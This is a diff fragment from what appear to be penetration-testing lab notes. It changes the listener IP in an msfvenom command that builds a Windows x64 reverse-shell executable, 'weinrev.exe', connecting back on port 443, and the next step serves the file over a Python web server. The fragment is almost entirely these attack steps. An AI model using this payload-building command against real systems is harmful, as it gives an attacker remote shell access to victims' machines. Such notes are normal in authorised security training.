@@ -7,7 +7,7 @@
 1. make revshell exe file
    
    ```
-   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.168.139 LPORT=443 -f exe > weinrev.exe
+   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.209 LPORT=443 -f exe > weinrev.exe
    ```
 2. Run a python server on this directory
    ```
